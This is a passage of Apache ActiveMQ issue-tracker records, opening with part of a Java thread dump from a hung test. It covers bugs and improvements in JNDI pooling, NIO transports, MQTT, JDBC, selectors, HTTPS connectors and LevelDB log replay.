sun.nio.ch.Util$2) locked <0x3aac8928> (a java.util.Collections$UnmodifiableSet) locked <0x3aac8728> (a sun.nio.ch.PollSelectorImpl)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:98)        at org.apache.activemq.transport.nio.SelectorWorker.run(SelectorWorker.java:93)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)        at java.lang.Thread.run(Thread.java:744)"ActiveMQ NIO Worker 1" daemon prio=8 tid=0x007de000 nid=34 lwp_id=2776218 waiting on condition &#91;0x32340000&#93;   java.lang.Thread.State: TIMED_WAITING (parking)        at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x3a877bd0> (a java.util.concurrent.SynchronousQueue$TransferStack)        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)        at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460)        at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359)        at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942)        at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)        at java.lang.Thread.run(Thread.java:744)"hawtdispatch timer" daemon prio=8 tid=0x012aec00 nid=31 lwp_id=2776215 in Object.wait() &#91;0x32580000&#93;   java.lang.Thread.State: TIMED_WAITING (on object monitor)        at java.lang.Object.wait(Native Method) waiting on <0x3a878838> (a java.lang.Object)        at java.lang.Object.wait(Object.java:461)        at org.fusesource.hawtdispatch.internal.TimerThread.run(TimerThread.java:188) locked <0x3a878838> (a java.lang.Object)"hawtdispatch-DEFAULT-8" daemon prio=8 tid=0x012ab600 nid=30 lwp_id=2776214 runnable &#91;0x32640000&#93;   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.PollArrayWrapper.poll0(Native Method)        at sun.nio.ch.PollArrayWrapper.poll(PollArrayWrapper.java:187)        at sun.nio.ch.PollSelectorImpl.doSelect(PollSelectorImpl.java:73)        at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:87) locked <0x3a885cf0> (a sun.nio.ch.Util$2) locked <0x3a885ce0> (a java.util.Collections$UnmodifiableSet) locked <0x3a885bb8> (a sun.nio.ch.PollSelectorImpl)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:98)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:102)        at org.fusesource.hawtdispatch.internal.NioManager$SelectStrategy.select(NioManager.java:52)        at org.fusesource.hawtdispatch.internal.NioManager.select(NioManager.java:182)        at org.fusesource.hawtdispatch.internal.pool.SimplePool.park(SimplePool.java:130)        at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:75)"hawtdispatch-DEFAULT-7" daemon prio=8 tid=0x012a9000 nid=29 lwp_id=2776213 runnable &#91;0x32700000&#93;   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.PollArrayWrapper.poll0(Native Method)        at sun.nio.ch.PollArrayWrapper.poll(PollArrayWrapper.java:187)        at sun.nio.ch.PollSelectorImpl.doSelect(PollSelectorImpl.java:73)        at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:87) locked <0x3a879350> (a sun.nio.ch.Util$2) locked <0x3a879340> (a java.util.Collections$UnmodifiableSet) locked <0x3a879218> (a sun.nio.ch.PollSelectorImpl)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:98)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:102)        at org.fusesource.hawtdispatch.internal.NioManager$SelectStrategy.select(NioManager.java:52)        at org.fusesource.hawtdispatch.internal.NioManager.select(NioManager.java:182)        at org.fusesource.hawtdispatch.internal.pool.SimplePool.park(SimplePool.java:130)        at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:75)"hawtdispatch-DEFAULT-6" daemon prio=8 tid=0x012a6c00 nid=28 lwp_id=2776212 runnable &#91;0x327c0000&#93;   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.PollArrayWrapper.poll0(Native Method)        at sun.nio.ch.PollArrayWrapper.poll(PollArrayWrapper.java:187)        at sun.nio.ch.PollSelectorImpl.doSelect(PollSelectorImpl.java:73)        at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:87) locked <0x3a87ab38> (a sun.nio.ch.Util$2) locked <0x3a87ab28> (a java.util.Collections$UnmodifiableSet) locked <0x3a87aa00> (a sun.nio.ch.PollSelectorImpl)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:98)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:102)        at org.fusesource.hawtdispatch.internal.NioManager$SelectStrategy.select(NioManager.java:52)        at org.fusesource.hawtdispatch.internal.NioManager.select(NioManager.java:182)        at org.fusesource.hawtdispatch.internal.pool.SimplePool.park(SimplePool.java:130)        at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:75)"hawtdispatch-DEFAULT-5" daemon prio=8 tid=0x01281a00 nid=27 lwp_id=2776211 runnable &#91;0x32880000&#93;   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.PollArrayWrapper.poll0(Native Method)        at sun.nio.ch.PollArrayWrapper.poll(PollArrayWrapper.java:187)        at sun.nio.ch.PollSelectorImpl.doSelect(PollSelectorImpl.java:73)        at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:87) locked <0x3a87b298> (a sun.nio.ch.Util$2) locked <0x3a87b288> (a java.util.Collections$UnmodifiableSet) locked <0x3a87b160> (a sun.nio.ch.PollSelectorImpl)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:98)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:102)        at org.fusesource.hawtdispatch.internal.NioManager$SelectStrategy.select(NioManager.java:52)        at org.fusesource.hawtdispatch.internal.NioManager.select(NioManager.java:182)        at org.fusesource.hawtdispatch.internal.pool.SimplePool.park(SimplePool.java:130)        at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:75)"hawtdispatch-DEFAULT-4" daemon prio=8 tid=0x0127c400 nid=26 lwp_id=2776210 runnable &#91;0x32940000&#93;   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.PollSelectorImpl.wakeup(PollSelectorImpl.java:103) locked <0x3a880718> (a java.lang.Object)        at org.fusesource.hawtdispatch.internal.NioManager.wakeupIfSelecting(NioManager.java:157)        at org.fusesource.hawtdispatch.internal.pool.SimplePool.execute(SimplePool.java:121)        at org.fusesource.hawtdispatch.internal.GlobalDispatchQueue.execute(GlobalDispatchQueue.java:100)        at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.triggerExecution(SerialDispatchQueue.java:128)        at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.enqueue(SerialDispatchQueue.java:75)        at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.execute(SerialDispatchQueue.java:52)        at org.fusesource.hawtdispatch.internal.NioDispatchSource.fire(NioDispatchSource.java:204)        at org.fusesource.hawtdispatch.internal.NioAttachment.selected(NioAttachment.java:45)        at org.fusesource.hawtdispatch.internal.NioManager.processSelected(NioManager.java:217)        at org.fusesource.hawtdispatch.internal.NioManager.select(NioManager.java:193)        at org.fusesource.hawtdispatch.internal.pool.SimplePool.park(SimplePool.java:130)        at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:75)"hawtdispatch-DEFAULT-3" daemon prio=8 tid=0x0127a000 nid=25 lwp_id=2776209 runnable &#91;0x32a00000&#93;   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.PollArrayWrapper.poll0(Native Method)        at sun.nio.ch.PollArrayWrapper.poll(PollArrayWrapper.java:187)        at sun.nio.ch.PollSelectorImpl.doSelect(PollSelectorImpl.java:73)        at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:87) locked <0x3a87d278> (a sun.nio.ch.Util$2) locked <0x3a87d268> (a java.util.Collections$UnmodifiableSet) locked <0x3a87d140> (a sun.nio.ch.PollSelectorImpl)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:98)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:102)        at org.fusesource.hawtdispatch.internal.NioManager$SelectStrategy.select(NioManager.java:52)        at org.fusesource.hawtdispatch.internal.NioManager.select(NioManager.java:182)        at org.fusesource.hawtdispatch.internal.pool.SimplePool.park(SimplePool.java:130)        at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:75)"hawtdispatch-DEFAULT-2" daemon prio=8 tid=0x01217800 nid=24 lwp_id=2776208 runnable &#91;0x32ac0000&#93;   java.lang.Thread.State: RUNNABLE        at sun.nio.ch.PollArrayWrapper.poll0(Native Method)        at sun.nio.ch.PollArrayWrapper.poll(PollArrayWrapper.java:187)        at sun.nio.ch.PollSelectorImpl.doSelect(PollSelectorImpl.java:73)        at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:87) locked <0x3a880b18> (a sun.nio.ch.Util$2) locked <0x3a880b08> (a java.util.Collections$UnmodifiableSet) locked <0x3a8809e0> (a sun.nio.ch.PollSelectorImpl)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:98)        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:102)        at org.fusesource.hawtdispatch.internal.NioManager$SelectStrategy.select(NioManager.java:52)        at org.fusesource.hawtdispatch.internal.NioManager.select(NioManager.java:182)        at org.fusesource.hawtdispatch.internal.pool.SimplePool.park(SimplePool.java:130)        at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:75)"hawtdispatch-DEFAULT-1" daemon prio=8 tid=0x01206200 nid=23 lwp_id=2776207 runnable &#91;0x32b80000&#93;   java.lang.Thread.State: RUNNABLE        at java.lang.Throwable.fillInStackTrace(Native Method)        at java.lang.Throwable.fillInStackTrace(Throwable.java:783) locked <0x65811c80> (a java.io.EOFException)        at java.lang.Throwable.<init>(Throwable.java:265)        at java.lang.Exception.<init>(Exception.java:66)        at java.io.IOException.<init>(IOException.java:58)        at java.io.EOFException.<init>(EOFException.java:63)        at org.fusesource.hawtdispatch.transport.AbstractProtocolCodec.read(AbstractProtocolCodec.java:331)        at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:710)        at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:592)        at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209)        at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100)        at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)"Service Thread" daemon prio=8 tid=0x008cc800 nid=18 lwp_id=2776202 runnable &#91;0x00000000&#93;   java.lang.Thread.State: RUNNABLE"C2 CompilerThread1" daemon prio=8 tid=0x008c7a00 nid=16 lwp_id=2776200 waiting on condition &#91;0x00000000&#93;   java.lang.Thread.State: RUNNABLE"C2 CompilerThread0" daemon prio=8 tid=0x008c3000 nid=15 lwp_id=2776199 waiting on condition &#91;0x00000000&#93;   java.lang.Thread.State: RUNNABLE"Signal Dispatcher" daemon prio=8 tid=0x008c0c00 nid=14 lwp_id=2776198 runnable &#91;0x00000000&#93;   java.lang.Thread.State: RUNNABLE"Finalizer" daemon prio=8 tid=0x008abc00 nid=13 lwp_id=2776197 in Object.wait() &#91;0x35a80000&#93;   java.lang.Thread.State: WAITING (on object monitor)        at java.lang.Object.wait(Native Method) waiting on <0x3a8de9f0> (a java.lang.ref.ReferenceQueue$Lock)        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:152) locked <0x3a8de9f0> (a java.lang.ref.ReferenceQueue$Lock)        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:168)        at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:227)"Reference Handler" daemon prio=8 tid=0x0079f800 nid=12 lwp_id=2776196 in Object.wait() &#91;0x35b40000&#93;   java.lang.Thread.State: WAITING (on object monitor)        at java.lang.Object.wait(Native Method) waiting on <0x3a8e76e8> (a java.lang.ref.Reference$Lock)        at java.lang.Object.wait(Object.java:503)        at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:140) locked <0x3a8e76e8> (a java.lang.ref.Reference$Lock)"main" prio=8 tid=0x00456e00 nid=1 lwp_id=-1 in Object.wait() &#91;0x7fffd000&#93;   java.lang.Thread.State: TIMED_WAITING (on object monitor)        at java.lang.Object.wait(Native Method) waiting on <0x3aace690> (a org.junit.internal.runners.statements.FailOnTimeout$StatementThread)        at java.lang.Thread.join(Thread.java:1288) locked <0x3aace690> (a org.junit.internal.runners.statements.FailOnTimeout$StatementThread)        at org.junit.internal.runners.statements.FailOnTimeout.evaluateStatement(FailOnTimeout.java:26)        at org.junit.internal.runners.statements.FailOnTimeout.evaluate(FailOnTimeout.java:17)        at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:26)        at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:27)        at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55)        at org.junit.rules.RunRules.evaluate(RunRules.java:20)        at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271)        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70)        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50)        at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238)        at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63)        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236)        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53)        at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229)        at org.junit.runners.ParentRunner.run(ParentRunner.java:309)        at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264)        at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153)        at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124)        at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200)        at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153)        at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)"VM Thread" prio=8 tid=0x00791e00 nid=11 lwp_id=2776195 runnable "GC task thread#0 (ParallelGC)" prio=8 tid=0x00471200 nid=3 lwp_id=2776187 runnable "GC task thread#1 (ParallelGC)" prio=8 tid=0x00497a00 nid=4 lwp_id=2776188 runnable "GC task thread#2 (ParallelGC)" prio=8 tid=0x00499e00 nid=5 lwp_id=2776189 runnable "GC task thread#3 (ParallelGC)" prio=8 tid=0x0049c000 nid=6 lwp_id=2776190 runnable "GC task thread#4 (ParallelGC)" prio=8 tid=0x0049e400 nid=7 lwp_id=2776191 runnable "GC task thread#5 (ParallelGC)" prio=8 tid=0x004a0800 nid=8 lwp_id=2776192 runnable "GC task thread#6 (ParallelGC)" prio=8 tid=0x004a2a00 nid=9 lwp_id=2776193 runnable "GC task thread#7 (ParallelGC)" prio=8 tid=0x004a4e00 nid=10 lwp_id=2776194 runnable "VM Periodic Task Thread" prio=8 tid=0x008caa00 nid=17 lwp_id=2776201 waiting on condition JNI global references: 160
issueID:AMQ-5268
type:Bug
changed files:
texts:PooledConnectionFactory gets in endless loop when storing into JNDI
We got into troubles when upgrading from 5.7.0 to new version 5.10.0. One of our tests which uses binding of PooledConnectionFactory into JNDI (tomcat-naming) got stuck and computes in endless loop.Problem is implementation of interface org.apache.activemq.jndi.JNDIStorableInterface in class org.apache.activemq.pool.PooledConnectionFactory: method populateProperties(Properties props) implementation uses IntrospectionSupport.getProperties(...) in order to set properties for all getters, setting properties works for basic types, but causes stack overflow for getters - getReference() and getProperties() which creates recursion loops loop #1: PooledConnectionFactory.getProperties -> PooledConnectionFactory.populateProperties -> IntrospectionSupport.getProperties -> PooledConnectionFactory.getProperties loop #2: PooledConnectionFactory.getProperties -> PooledConnectionFactory.populateProperties -> IntrospectionSupport.getProperties -> PooledConnectionFactory.getReference -> JNDIReferenceFactory.createReference -> PooledConnectionFactory.getProperties additional info: recursion loop doesn"t end with StackOverflowError, but InvocationTargetException is propagated to IntrospectionSupport.getProperties method where it is being ignored and causes "almost endless" computation (exponential complexity)Example test without using JNDI, but using key methods showing the problem and its possible solution/workaround for AMQ 5.10.0 is attached.We found that error exists for AMQ 5.9.0 and newer after resolving following issue AMQ-4757.
issueID:AMQ-5269
type:Bug
changed files:TcpTransportServer.java
SelectorManager.java
SelectorSelection.java
texts:NIO transports using blocking accept calls, very slow shutdown
Currently, all the TCP based transports are using the old blocking style of socket.accept() to accept connections.   This works "OK" except that for sockets that have a channel associated with them, the socket.close() doesn"t cause it to return immediately.  It still waits for the SoTimeout which is currently set a 2 seconds.   That can cause 2 second delays for any shutdown which causes long, unnecessary delays, particularly in the tests.One possible "fix" is to drop the socket.setSoTimeout(2000) call to something much smaller.   However, that would turn the accept thread into a more "busy wait" scenario which is undesirable.A better fix is to change the accepts for the sockets that have a ServerSocketChannel to use the NIO based selectors for the accept operations.   The selector.disable()/selector.close() allows the socket and everything to close immediately.  The result is that the NIO based tests now take the same amount of time as the non-NIO based tests (for which socket.close() causes the accept to return immediately).Pull request forthcoming.
issueID:AMQ-5270
type:Test
changed files:
texts:JoramJmsTests hang on some platforms
Several of the JoramJmsTest suites (in particular JoramJmsNioTest and JoramJmsSslTest) hang on Windows and Solaris boxes under Jenkins.
issueID:AMQ-5271
type:New Feature
changed files:
texts:Add an in-memory JobSchedulerStore implementation
For brokers that run with persistence disabled there currently no in-memory job scheduler store so an embedded broker without persistence can"t have scheduled messages or do broker led redelivery without manually configuring in the normal JobSchedulerStore impl which requires a disk based store.  We should add an in memory variant that is the default if persistence is disabled but scheduler support is enabled.
issueID:AMQ-5274
type:Bug
changed files:
texts:Stuck messages and CPU churn when aborted transacted message expires
The test case is a simple producer/consumer:Producer: 20 messages are injected, with a timeout of 10s.Consumer: The redelivery policy is set to 0 retries (the issue exists with other values). The consumer uses transactions and throws a runtime exception on each message received.queue stats show 20 enqueue, 19 dequeue, 1 pendingDLQ stat show 20 enqueue: all 20 messages go to DLQ, IDs ending in 1-10 for failing, 11-20 for expiry (approx)the pending item (ID ending in 10) is a "ghost message" , and remains stuck indefinitely in queue.testif you browse, the message is not shownA) if you restart the broker, after a short while the message is cleaned:jvm 1    |  WARN | Duplicate message add attempt rejected. Destination: QUEUE://ActiveMQ.DLQ, Message id: ID:REDACTED-52872-1405079629779-1:1:1:1:10jvm 1    |  WARN | org.apache.activemq.broker.region.cursors.QueueStorePrefetch@5b427f3c:ActiveMQ.DLQ,batchResetNeeded=false,storeHasMessages=true,size=0,cacheEnabled=true,maxBatchSize:20,hasSpace:true - cursor got duplicate: ID:REDACTED--52872-1405079629779-1:1:1:1:10, 4jvm 1    |  WARN | duplicate message from store ID:REDACTED--52872-1405079629779-1:1:1:1:10, redirecting for dlq processingB) if you purge, ActiveMQ logs a warning: "WARN | queue://queue.test after purge complete, message count stats report: 1" the queue is marked as being empty. however if you restart the broker, the message re-appears shorty, before being cleaned as aboveSUPPLEMENTARY: with activeMQ 5.9.0 and above , if you run the injection several times, the CPU usage of ActiveMQ climbs drastically until the queue is purged.
issueID:AMQ-5277
type:Bug
changed files:JDBCMessageStore.java
BaseDestination.java
texts:JDBC ack does not use messageId.entryLocator
The jdbc message store was doing a jdbc roundtrip to find the sequence id of a message before a remove. this information was being retained in the messageId entryLocator on insert.However it was not being recreated on a recover and it was lost on a message ack unless vm transport was in play.By reusing the entryLocator information there is a ~30% improvement in simple produce/consume roundrtip tests.
issueID:AMQ-5279
type:Bug
changed files:
texts:failover redelivery to alternative consumers with pending transaction  causes rollback *and* dlq processing
failover isolates the application client from transport failures. For a single consumer, if there is a pending transaction and an ack is lost the transaction can still commit after failover if the messages is redispatched. If it is not redispatched, then the transaction will rollback.With multiple consumers it is possible that an alternative consumer will get redelivery. If the alternative consumer is on a different connection the duplicate dispatch (tracked by a connection) is not identified, redelivery ensues and the pending transaction rolls back.If the consumer is on the same connection, the redelivery is treated as a duplicate, the message gets a poison ack and the pending transaction rolls back. This is a double whammy and results in a delivery to the DLQ in error.The redelivery should be routed to the alternative consumer as if it were on a different connection so that the message can be consumed.We should DLQ only when the redispatch is not pending on any consumer.
issueID:AMQ-5281
type:Bug
changed files:
texts:Incorrect handling of unknown values in selectors
Due to JmsMessage specification :http://docs.oracle.com/javaee/1.4/api/javax/jms/Message.htmlThere are rules how unknown Values evaluates. I found 4 violations of specificatoion:1) Equals expression "="."unknownProp = 0" should evaluate to UNKNOWN.In AMQ it evaluates to FALSE instead.2) Not equals expression "<>"."unknownProp <> 0" should evaluate to UNKNOWN, it evaluates to FALSE instead.3) Or expression "or"."unknown or false" should evaluate to UNKNOWN. It evaluates to FALSE instead.4) And expression "and"."unknown and false" should evaluate to FALSE. It evaluates to UNKNOWN instead.
issueID:AMQ-5288
type:Bug
changed files:
texts:Return proper error codes to MQTT client on failed connect.
Currently the MQTT protocol converter doesn"t really try to map connection error into the MQTT spec codes.  We need to distinguish between bad client Ids and authentication issues.  We should return codes that match these error conditionsInvalidClientIdException - 0x02 Connection Refused, identifier rejectedCredentialException - 0x04 Connection Refused, bad user name or passwordSecurityException - 0x05 Connection Refused, not authorized
issueID:AMQ-5289
type:Improvement
changed files:
texts:Track forwards across a network in destination statistics
When using message stats for accountability in a broker mesh the forwarding of messages results in duplicate accounting because the same message is dequeued multiple times, when forwarded and when consumed.tracking forwards in the destination statistic means that local consumption can be captured with dequeueCount - forwardCount
issueID:AMQ-529
type:New Feature
changed files:TcpTransportFactory.java
texts:Support transport options for specifying the client local socket port number and ip address for TCP and SSL
ActiveMQ supports TCP and SSL transport, allowing client to connect to the JMS broker using socket:http://www.activemq.org/TCP+Transport+ReferenceIt would be really nice if it can support transport options for specifying the client local socket port number or ip address.
issueID:AMQ-5290
type:Improvement
changed files:MQTTSubscription.java
ResponseHandler.java
MQTTProtocolSupport.java
MQTTProtocolConverter.java
texts:MQTT clients using durable subscriptions on networked brokers received duplicates
MQTT clients that create durable subscriptions and that operate in a network of Brokers can receive duplicate messages when they start failing back and forth between brokers in the network.We should investigate using Virtual Destinations under the covers instead of durable topics subscriptions as this is a known problem with the durable topic case.  With Virtual Destinations the client would be subscribed to a Queue that would receive all messages sent to the target Topic.
issueID:AMQ-5292
type:Improvement
changed files:
texts:Add support for publishing to MQTT &#39;$&#39; Topics (that start with the prefix &#39;$&#39;)
Legacy MQTT applications may be using Topics that start with the reserved prefix "$" for Topic names. Add a switch to allow these applications to continue publishing and receiving messages from such topics.
issueID:AMQ-5294
type:Improvement
changed files:
texts:Unify client and sampler timings in activemq-perf-maven-plugin
Fundamentally there are 2 entities in the plugin managed by differentthreads/threadpools: the client (generic term for producer of consumer) the samplers (throughput + cpu)These entities can all be configured separately, and the plugin does notcomplete until the slowest of these is done. Now, the problem is thatthese things all have separate flags, which generally aren"t overriddenunless you want to use a really long command line. For example, to get aperf test that runs for 10 seconds, you have to do the following:mvn activemq-perf:producer -Dproducer.sendDuration=10000-DtpSampler.duration=10000 -DtpSampler.rampUpTime=0-DtpSampler.rampDownTime=0 -DcpuSampler.duration=10000-DcpuSampler.rampUpTime=0 -DcpuSampler.rampDownTime=0And all this is before you start adding flags to do anything useful withit. This is because: 1. sampler threads sleep for the ramp-up time (default 30s); if this    is longer than the producer"s send duration then the sampler won"t    even start doing anything until |the producer has well and truly    completed 2. the test runs until the longest configured sampler (by default both    throughput + cpu run)So it"s kind of a mess. I"d love to be able to use the principle ofleast surprise (and configuration) so that you can just do this:    mvn activemq-perf:producer -Dproducer.sendDuration=10000    mvn activemq-perf:producer -Dproducer.sendType=count    -Dproducer.sendCount=10000
issueID:AMQ-5295
type:Bug
changed files:HttpsClientTransport.java
texts:HTTPS Network Connector doesn&#39;t work with Mutual authentication- HTTPSClientTransport uses wrong SSLSocketFactory
HttpsClientTransport is getting wrong SSLSocketFactory.The problem is here:    private SchemeRegistry createSchemeRegistry() {        SchemeRegistry schemeRegistry = new SchemeRegistry();        try {            // register the default socket factory so that it looks at the javax.net.ssl.keyStore,            // javax.net.ssl.trustStore, etc, properties by default            SSLSocketFactory sslSocketFactory =                    new SSLSocketFactory((javax.net.ssl.SSLSocketFactory) javax.net.ssl.SSLSocketFactory.getDefault(),                    SSLSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);            schemeRegistry.register(new Scheme("https", getRemoteUrl().getPort(), sslSocketFactory));            return schemeRegistry;        } catch (Exception e) {            throw new IllegalStateException("Failure trying to create scheme registry", e);        }    }The problem with that code is, that it never take SSLSocketFactory from spring context. So the one defined in XML is ignored.So it"s code have to be replaced with:    private SchemeRegistry createSchemeRegistry() {        SchemeRegistry schemeRegistry = new SchemeRegistry();        try {            // register the default socket factory so that it looks at the javax.net.ssl.keyStore,            // javax.net.ssl.trustStore, etc, properties by default            SSLSocketFactory sslSocketFactory = createSocketFactory();            schemeRegistry.register(new Scheme("https", getRemoteUrl().getPort(), sslSocketFactory));            return schemeRegistry;        } catch (Exception e) {            throw new IllegalStateException("Failure trying to create scheme registry", e);        }    }And then new method should be added:    /**     * Creates a new SSL SocketFactory. The given factory will use user-provided     * key and trust managers (if the user provided them).     *     * @return Newly created (Ssl)SocketFactory.     * @throws IOException     */    protected SocketFactory createSocketFactory() throws IOException {        if (SslContext.getCurrentSslContext() != null) {            SslContext ctx = SslContext.getCurrentSslContext();            try {                return ctx.getSSLContext().getSocketFactory();            } catch (Exception e) {                throw IOExceptionSupport.create(e);            }        } else {            return SSLSocketFactory.getDefault();        }    }This is consistent solution with other transports.I will prepare patches and tests for this scenerio.GreetingsPiotr Klimczak
issueID:AMQ-5298
type:Bug
changed files:
texts:MQTT Transport can generate class cast exception when subscription is to a Virtual Topic
When a client subscribes to a Virtual Topic and sends a duplicate subscription request the method that resends the old retained messages tries to cast the destination from the TopicRegion is finds to a Topic but in this case it would be a VirtualTopicIntercepter and an exception is thrown disconnecting the client.
issueID:AMQ-5299
type:Bug
changed files:MQTTProtocolConverter.java
texts:MQTT does to calls to unsubscribe on a duplicate subscription request.
When a duplicate subscription with differing QoS value is received the protocol converter does two onUnsubscribe calls, only one is needed.
issueID:AMQ-5300
type:Bug
changed files:
texts:Inifinite loop when attempting to replay levelDB logs to rebuild index
While searching for a workaround for issue AMQ-5284, I came across this issue.To work around the serialization issue (AMQ-5284), I deleted the index snapshots from the LevelDB datastore. This will replay the logs to regenerate the index. However, if a log rotation has already occurred, you will get an infinite loop upon restart.Here are the steps to reproduce what I am seeing:Configure ActiveMQ 5.10.0 to use a LevelDB data store with the log size of about 1MB.<persistenceAdapter>    <levelDB directory="${activemq.data}/leveldb" logSize="1000000" /></persistenceAdapter>Then I started up the broker and published 10,000 persistent messages to a queue, causing the log files to rotate (twice in my case). I see the following files in the data store folder:-rw-rw-r--. 1 user users 1000071 Jul 30 11:15 0000000000000000.log-rw-rw-r--. 1 user users 1000009 Jul 30 11:16 00000000000f4287.logdrwxrwxr-x. 2 user users    4096 Jul 30 11:16 00000000001e84d0.index-rw-rw-r--. 1 user users 1000000 Jul 30 11:17 00000000001e84d0.logdrwxrwxr-x. 2 user users    4096 Jul 30 11:11 dirty.index-rw-rw-r--. 1 user users       0 Jul 30 11:11 lockdrwxrwxr-x. 2 user users    4096 Jul 30 11:11 plist.index-rw-rw-r--. 1 user users      24 Jul 30 11:11 store-version.txtI then consume 5,000 messages, which causes the first log to be deleted since it is no longer being referenced. I see the following log statements:2014-07-30 11:29:14,960 | DEBUG | Log no longer referenced: 0 | org.apache.activemq.leveldb.LevelDBClient | Thread-22014-07-30 11:29:14,967 | DEBUG | Deleting log at 0 | org.apache.activemq.leveldb.LevelDBClient | Thread-2And I see the remaining files in the data store folder (notice the 0000000000000000.log is gone):-rw-rw-r--. 1 user users 1000009 Jul 30 11:16 00000000000f4287.log-rw-rw-r--. 1 user users 1000011 Jul 30 11:29 00000000001e84d0.logdrwxrwxr-x. 2 user users    4096 Jul 30 11:29 00000000002dc71b.index-rw-rw-r--. 1 user users 1000000 Jul 30 11:29 00000000002dc71b.logdrwxrwxr-x. 2 user users    4096 Jul 30 11:11 dirty.index-rw-rw-r--. 1 user users       0 Jul 30 11:11 lockdrwxrwxr-x. 2 user users    4096 Jul 30 11:11 plist.index-rw-rw-r--. 1 user users      24 Jul 30 11:11 store-version.txtAt this point, I shut down the broker and here is the listing of what"s left in the data store:-rw-rw-r--. 1 user users 1000009 Jul 30 11:16 00000000000f4287.log-rw-rw-r--. 1 user users 1000011 Jul 30 11:29 00000000001e84d0.log-rw-rw-r--. 1 user users 1000000 Jul 30 11:29 00000000002dc71b.logdrwxrwxr-x. 2 user users    4096 Jul 30 11:36 0000000000301737.indexdrwxrwxr-x. 2 user users    4096 Jul 30 11:11 dirty.indexdrwxrwxr-x. 2 user users    4096 Jul 30 11:11 plist.index-rw-rw-r--. 1 user users      24 Jul 30 11:11 store-version.txtI then delete the index folder within the data store (in my case "0000000000301737.index"). I am doing this to force a replay of the logs to regenerate the index (due to the serialization issue I ran into).And finally, this is the message I am getting once I start the broker back up (infinite loop of this same message, and I have to shut down the broker):2014-07-30 11:40:27,415 | WARN  | No reader available for position: 0, log_infos: 